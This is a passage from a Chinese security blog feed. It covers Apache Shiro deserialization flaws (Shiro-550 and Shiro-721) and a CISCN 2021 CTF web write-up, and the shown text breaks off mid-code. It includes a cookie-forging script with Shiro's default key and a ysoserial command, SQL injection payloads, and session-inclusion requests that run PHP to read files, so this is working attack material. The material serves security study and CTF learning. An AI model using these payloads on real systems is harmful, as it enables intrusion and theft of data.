title="环境搭建"></a>环境搭建</h4><p>下载Shiro并切换到漏洞版本</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/apache/shiro.gitcd shirogit checkout shiro-root-<span class="number">1.2</span>.<span class="number">4</span></span><br></pre></td></tr></table></figure><p>pom.xml修改，添加</p><p>jstl是为了jsp正常运行，commons-collections4引入反序列化利用链</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>    <span class="comment">&lt;!--  这里需要将jstl设置为1.2 --&gt;</span>    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span>    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span> <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>idea导入<code>shiro/samples/web</code>，等待idea自动下载导入项目依赖的包</p><p>Edit Configurations 添加TomcatServer，并添加Deployment</p><p><img src="/2021/06/28/Web_19/20210624150142.png" alt="image-20210624150056867"></p><p><img src="/2021/06/28/Web_19/20210624150217.png" alt="image-20210624150216734"></p><p>然后调试运行即可</p><p><img src="/2021/06/28/Web_19/20210624151018.png" alt="image-20210624151014898"></p><h4 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>burp插件发现默认key</p><p><img src="/2021/06/28/Web_19/20210624154428.png" alt="image-20210624154426736"></p><p>rememberMe cookie生成脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sysimport base64import uuidfrom random <span class="keyword">import</span> Randomimport subprocessfrom Crypto.Cipher <span class="keyword">import</span> AES key  =  <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>mode =  AES.MODE_CBCIV   = uuid.uuid4().bytesencryptor = AES.new(base64.b64decode(key), mode, IV) payload=base64.b64decode(sys.argv[<span class="number">1</span>])BS   = AES.block_sizepad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()payload=pad(payload) print(base64.b64encode(IV + encryptor.encrypt(payload)))</span><br></pre></td></tr></table></figure><p>yso payload生成</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-<span class="number">0.0</span><span class="number">.6</span>-SNAPSHOT-all.jar CommonsCollections2 <span class="string">"calc"</span>|<span class="built_in">base64</span> -w0|sed ':<span class="built_in">label</span>;N;s/\n//;b <span class="built_in">label</span>'</span><br></pre></td></tr></table></figure><p>然后生成用上面脚本生成cookie</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">py</span> -<span class="number">3</span> encode.<span class="keyword">py</span> &lt;yso payload&gt;</span><br></pre></td></tr></table></figure><p><img src="/2021/06/28/Web_19/20210624161828.png" alt="image-20210624161827948"></p><p>也可以使用图形化工具，一键利用，<a href="https://github.com/feihong-cs/ShiroExploit-Deprecated" target="_blank" rel="noopener">https://github.com/feihong-cs/ShiroExploit-Deprecated</a></p><p><img src="/2021/06/28/Web_19/20210624154644.png" alt="image-20210624154642996"></p><h4 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><h5 id="cookie生成"><a href="#cookie生成" class="headerlink" title="cookie生成"></a>cookie生成</h5><p>处理rememberme的cookie的类为<code>org.apache.shiro.web.mgt.CookieRememberMeManager</code>，它继承自<code>org.apache.shiro.mgt.AbstractRememberMeManager</code>，其中在AbstractRememberMeManager中定义了加密cookie所需要使用的密钥，可以看到密匙是直接硬编码写死的</p><p><img src="/2021/06/28/Web_19/20210624171323.png" alt="image-20210624171322168"></p><p>成功登录时，会进入onSuccessfulLogin方法</p><p><img src="/2021/06/28/Web_19/20210624171438.png" alt="image-20210624171437672"></p><p>当rememberMe设置为on时，最后会进入两个参数的rememberIdentity函数，accountPrincipals为用户权限类型</p><p><img src="/2021/06/28/Web_19/20210624210041.png" alt="image-20210624210040095"></p><p>跟进convertPrincipalsToBytes，this.serialize调用原生序列化类序列化数据，序列化之后通过encrypt函数加密</p><p><img src="/2021/06/28/Web_19/20210624210400.png" alt="image-20210624210359887"></p><p>encrypt调用cipherService.encrypt，最终返回bytes值</p><p><img src="/2021/06/28/Web_19/20210624210544.png" alt="image-20210624210543832"></p><p>跟进cipherService.encrypt</p><p><img src="/2021/06/28/Web_19/20210624210710.png" alt="image-20210624210709364"></p><p>调试可以发现这里使用AES加密，CBC模式，填充方式为PKCS5Padding</p><p><img src="/2021/06/28/Web_19/20210624210743.png" alt="image-20210624210742440"></p><p>iv的值跟进generateInitializationVector，会发现是随机生成的16位字符</p><p><img src="/2021/06/28/Web_19/20210624210912.png" alt="image-20210624210911168"></p><p>又进入一个encrypt函数，会进入第一个if逻辑，可以看到output是由16位iv加AES密文，最后返回Util.bytes(output)</p><p><img src="/2021/06/28/Web_19/20210624211104.png" alt="image-20210624211103305"></p><p>然后回到rememberIdentity，bytes即由16位iv加AES密文构成<img src="/2021/06/28/Web_19/20210624211317.png" alt="image-20210624211317251"></p><p>rememberSerializedIdentity为抽象类，在<code>org.apache.shiro.web.mgt.CookieRememberMeManager</code>实现，可以看到这里设置cookie为base64过后的bytes</p><p><img src="/2021/06/28/Web_19/20210624211521.png" alt="image-20210624211520917"></p><h5 id="cookie解析"><a href="#cookie解析" class="headerlink" title="cookie解析"></a>cookie解析</h5><p><code>org\apache\shiro\mgt\AbstractRememberMeManager.java</code>中getRememberedPrincipals处理rememberMe</p><p><img src="/2021/06/28/Web_19/20210628155306.png" alt="image-20210628155257906"></p><p>跟进getRememberedSerializedIdentity，base64解码rememberMe值</p><p><img src="/2021/06/28/Web_19/20210628155430.png" alt="image-20210628155429296"></p><p>继续跟进convertBytesToPrincipals</p><p><img src="/2021/06/28/Web_19/20210628155541.png" alt="image-20210628155540222"></p><p>deserialize调用默认的readObject方法</p><p><img src="/2021/06/28/Web_19/20210628155940.png" alt="image-20210628155939610"></p><h4 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><ol><li>更改默认密匙</li><li>动态生成密匙，不用自己提供。官方提供org.apache.shiro.crypto.AbstractSymmetricCipherService#generateNewKey()方法来进行AES的密钥生成</li></ol><h3 id="CVE-2019-12422（Shiro-721）"><a href="#CVE-2019-12422（Shiro-721）" class="headerlink" title="CVE-2019-12422（Shiro-721）"></a>CVE-2019-12422（Shiro-721）</h3><h4 id="影响范围-6"><a href="#影响范围-6" class="headerlink" title="影响范围"></a>影响范围</h4><ul><li>Apache Shiro &lt; 1.4.2</li></ul><h4 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/apache/shiro.git</span></span><br><span class="line">cd shiro</span><br><span class="line">git checkout shiro-root<span class="number">-1.4</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><p>然后配置好idea的tomcat就可以了</p><p>详细复现和分析可以查看，<a href="https://yinwc.github.io/2021/06/01/shiro721漏洞复现/，iv需要爆破，时间比较久就没有复现了，懒" target="_blank" rel="noopener">https://yinwc.github.io/2021/06/01/shiro721漏洞复现/，iv需要爆破，时间比较久就没有复现了，懒</a> :P</p><p>大概原理及利用Padding Oracle Attack，针对AES中的CBC加密，修改AES解密后的值为想要的内容，就可以反序列化进入garget</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.anquanke.com/post/id/240033" target="_blank" rel="noopener">Shiro 权限绕过的历史线（上）</a></li><li><a href="https://xz.aliyun.com/t/7964" target="_blank" rel="noopener">Apache Shiro权限绕过漏洞分析(CVE-2020-11989)</a></li><li><a href="https://www.anquanke.com/post/id/240202" target="_blank" rel="noopener">Shiro 权限绕过的历史线（下）</a></li><li><a href="https://xz.aliyun.com/t/7544" target="_blank" rel="noopener">Tomcat URL解析差异性导致的安全问题</a></li><li><a href="https://l3yx.github.io/2020/03/21/Shiro-1-2-4-反序列化漏洞/" target="_blank" rel="noopener">Shiro 1.2.4 反序列化漏洞</a></li><li><a href="https://xz.aliyun.com/t/6493" target="_blank" rel="noopener">Shiro RememberMe 1.2.4远程代码执行漏洞</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;权限绕过&quot;&gt;&lt;a href=&quot;#权限绕过&quot; class=&quot;headerlink&quot; title=&quot;权限绕过&quot;&gt;&lt;/a&gt;权限绕过&lt;/h2&gt;&lt;h3 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h3&gt;&lt;p&gt;基于此源码：&lt;a href=&quot;https://github.com/l3yx/springboot-shiro&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/l3yx/springboot-shiro&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;导入idea，application.properties添加&lt;/p&gt;
&lt;figure class=&quot;highlight ini&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;server.servlet.context-path&lt;/span&gt;=/test&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;因为pom.xml里排除了springboot内置的tomcat，新建Configurations-&amp;gt;Tomcat Server，添加新的deployment，并设置context为&lt;code&gt;/test&lt;/code&gt;，然后运行即可&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/06/28/Web_19/20210521160542.png&quot; alt=&quot;image-20210521160532545&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;Shiro基础&quot;&gt;&lt;a href=&quot;#Shiro基础&quot; class=&quot;headerlink&quot; title=&quot;Shiro基础&quot;&gt;&lt;/a&gt;Shiro基础&lt;/h3&gt;&lt;p&gt;Shiro验证&lt;/p&gt;
&lt;figure class=&quot;highlight properties&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;anon&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;不需要验证，可以直接访问&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;attr&quot;&gt;authc&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;需要验证，也就是我们需要bypass的地方&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;Shiro的URL路径表达式为Ant格式&lt;/p&gt;
&lt;figure class=&quot;highlight awk&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;regexp&quot;&gt;/hello 只匹配url http:/&lt;/span&gt;&lt;span class=&quot;regexp&quot;&gt;/demo.com/&lt;/span&gt;hello&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;regexp&quot;&gt;/h?      只匹配url  http:/&lt;/span&gt;&lt;span class=&quot;regexp&quot;&gt;/demo.com/&lt;/span&gt;h+任意一个字符&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;regexp&quot;&gt;/hello/&lt;/span&gt;*  匹配url下 http:&lt;span class=&quot;regexp&quot;&gt;//&lt;/span&gt;demo.com&lt;span class=&quot;regexp&quot;&gt;/hello/&lt;/span&gt;xxxx的任意内容，不匹配多个路径&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;regexp&quot;&gt;/hello/&lt;/span&gt;** 匹配url下 http:&lt;span class=&quot;regexp&quot;&gt;//&lt;/span&gt;demo.com&lt;span class=&quot;regexp&quot;&gt;/hello/&lt;/span&gt;xxxx&lt;span class=&quot;regexp&quot;&gt;/aaaa的任意内容，匹配多个路径&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
      <category term="Java" scheme="https://jlkl.github.io/tags/Java/"/>
    
      <category term="Web" scheme="https://jlkl.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2021初赛 Web Writeup</title>
    <link href="https://jlkl.github.io/2021/05/20/Web_18/"/>
    <id>https://jlkl.github.io/2021/05/20/Web_18/</id>
    <published>2021-05-20T06:54:55.000Z</published>
    <updated>2021-05-20T06:59:25.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>报错注入，盲猜flag表，但不知道名称，用重复column名爆列名</p><p>参考：<a href="https://reader-l.github.io/2020/06/01/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/" target="_blank" rel="noopener">无列名注入小记</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=%27)<span class="comment">/**/</span>||<span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flag<span class="comment">/**/</span><span class="keyword">where</span>(<span class="keyword">select</span><span class="comment">/**/</span>*<span class="comment">/**/</span><span class="keyword">from</span>(<span class="keyword">select</span><span class="comment">/**/</span>*<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flag<span class="comment">/**/</span><span class="keyword">as</span> a<span class="comment">/**/</span><span class="keyword">join</span><span class="comment">/**/</span>flag<span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>b<span class="comment">/**/</span><span class="keyword">using</span>(<span class="keyword">id</span>,<span class="keyword">no</span>))<span class="keyword">as</span><span class="comment">/**/</span>c))<span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span>(<span class="string">'1&amp;passwd=1&amp;Submit=%E7%99%BB%E5%BD%95</span></span><br></pre></td></tr></table></figure><p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20210518133714.png" alt="image-20210518133713042"></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname=%<span class="number">27</span>)<span class="comment">/**/</span><span class="literal">and</span><span class="comment">/**/</span>extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select<span class="comment">/**/</span>substr(`e691d77e-<span class="number">5</span>da1-<span class="number">409</span>b-a37b-ff4edfa14123`,<span class="number">31</span>)<span class="comment">/**/</span>from<span class="comment">/**/</span>flag),<span class="number">0</span>x7e))<span class="comment">/**/</span><span class="literal">and</span><span class="comment">/**/</span>('<span class="number">0</span>&amp;passwd=<span class="number">1</span>&amp;Submit=<span class="variable">%E7%</span><span class="number">99</span><span class="variable">%BB%</span>E5<span class="variable">%BD%</span><span class="number">95</span></span><br><span class="line"></span><br><span class="line">uname=%<span class="number">27</span>)<span class="comment">/**/</span><span class="literal">and</span><span class="comment">/**/</span>extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select<span class="comment">/**/</span>substr(`e691d77e-<span class="number">5</span>da1-<span class="number">409</span>b-a37b-ff4edfa14123`)<span class="comment">/**/</span>from<span class="comment">/**/</span>flag),<span class="number">0</span>x7e))<span class="comment">/**/</span><span class="literal">and</span><span class="comment">/**/</span>('<span class="number">0</span>&amp;passwd=<span class="number">1</span>&amp;Submit=<span class="variable">%E7%</span><span class="number">99</span><span class="variable">%BB%</span>E5<span class="variable">%BD%</span><span class="number">95</span></span><br></pre></td></tr></table></figure><p>读出flag CISCN{9fO5F-WC2YL-GY3zM-R4aIu-kAjxU-}</p><a id="more"></a><h2 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h2><p>原题：<a href="https://r0yanx.com/2020/10/28/fslh-writeup/" target="_blank" rel="noopener">https://r0yanx.com/2020/10/28/fslh-writeup/</a></p><h2 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h2><p>扫出来一个phpinfo 页面</p><p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20210518134151.png" alt="image-20210518134150949"></p><p>根据phpinfo ，猜测可能是 session 包含，因此启动两个线程，一个包含 php 内容，一个访问包含，就 var_dump /etc 了好几次有点难受</p><p>session_upload_process</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 124.71.229.172:21940</span><br><span class="line"><span class="attribute">User-Agent</span>: python-requests/2.25.1</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=star1</span><br><span class="line"><span class="attribute">Content-Length</span>: 1343</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=a052c080752fddf220113461b22d48a7</span><br><span class="line"></span><br><span class="line">--a052c080752fddf220113461b22d48a7</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">$root='/etc/fhfeeeaagb/badidicfgc/eabdhbdgeb/babgfddbff';</span><br><span class="line">$filenames=scandir($root);</span><br><span class="line"><span class="attribute">while(is_dir($filenames[2]))&#123;</span></span><br><span class="line">$root=$root.'/'.$filenames[2];</span><br><span class="line">$filenames=scandir($root);</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">var_dump($root.'/'.$filenames[2]);</span></span><br><span class="line"><span class="attribute">var_dump(file_get_contents($root.'/'.$filenames[2]));</span></span><br><span class="line"><span class="attribute">?&gt;</span></span><br><span class="line"><span class="attribute">--a052c080752fddf220113461b22d48a7</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename="1.txt"</span><br><span class="line"><span class="attribute">a*100000</span></span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 124.71.229.172:21940</span><br><span class="line"><span class="attribute">User-Agent</span>: python-requests/2.25.1</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=star1</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Length</span>: 124</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">cf=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flib%2Fphp%2Fsessions%2Fcafdcffacd%2Fsess_star1</span><br></pre></td></tr></table></figure><p>两个包放在repeater 里面 30 线程跑，不断看结果，改目录。<br>最后目录在<code>/etc/fhfeeeaagb/badidicfgc/eabdhbdgeb/babgfddbff/fbhbiaihha/fl444444g</code>直接包含<br>CISCN{lxs4A5ku06-ywSkx-iasCN-9AMPN-}</p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">"ctf"</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"ctf"</span>]))</span><br><span class="line">    $ctf = $_GET[<span class="string">"ctf"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($ctf==<span class="string">"upload"</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_FILES[<span class="string">'postedFile'</span>][<span class="string">'size'</span>] &gt; <span class="number">1024</span>*<span class="number">512</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"这么大个的东西你是想d我吗？"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $imageinfo = getimagesize($_FILES[<span class="string">'postedFile'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">    <span class="keyword">if</span> ($imageinfo === <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"如果不能好好传图片的话就还是不要来打扰我了"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($imageinfo[<span class="number">0</span>] !== <span class="number">1</span> &amp;&amp; $imageinfo[<span class="number">1</span>] !== <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"东西不能方方正正的话就很讨厌"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $fileName=urldecode($_FILES[<span class="string">'postedFile'</span>][<span class="string">'name'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(stristr($fileName,<span class="string">"c"</span>) || stristr($fileName,<span class="string">"i"</span>) || stristr($fileName,<span class="string">"h"</span>) || stristr($fileName,<span class="string">"ph"</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"有些东西让你传上去的话那可不得了"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $imagePath = <span class="string">"image/"</span> . mb_strtolower($fileName);</span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">"postedFile"</span>][<span class="string">"tmp_name"</span>], $imagePath)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"upload success, image at $imagePath"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"传都没有传上去"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getimagesize判断是否图片，要求图片宽和高为1，同时要求后缀不能有<code>c</code>、<code>i</code>、<code>h</code>、<code>ph</code>，那么上传php和<code>.htaccess</code>就不行了</p><p>example.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">"ctf"</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"ctf"</span>]))</span><br><span class="line">    $ctf = $_GET[<span class="string">"ctf"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($ctf==<span class="string">"poc"</span>) &#123;</span><br><span class="line">    $zip = <span class="keyword">new</span> \ZipArchive();</span><br><span class="line">    $name_for_zip = <span class="string">"example/"</span> . $_POST[<span class="string">"file"</span>];</span><br><span class="line">    <span class="keyword">if</span>(explode(<span class="string">"."</span>,$name_for_zip)[count(explode(<span class="string">"."</span>,$name_for_zip))<span class="number">-1</span>]!==<span class="string">"zip"</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"要不咱们再看看？"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($zip-&gt;open($name_for_zip) !== <span class="keyword">TRUE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">"都不能解压呢"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"可以解压，我想想存哪里"</span>;</span><br><span class="line">    $pos_for_zip = <span class="string">"/tmp/example/"</span> . md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">    $zip-&gt;extractTo($pos_for_zip);</span><br><span class="line">    $zip-&gt;close();</span><br><span class="line">    unlink($name_for_zip);</span><br><span class="line">    $files = glob(<span class="string">"$pos_for_zip/*"</span>);</span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file)&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_dir($file)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $first = imagecreatefrompng($file);</span><br><span class="line">        $size = 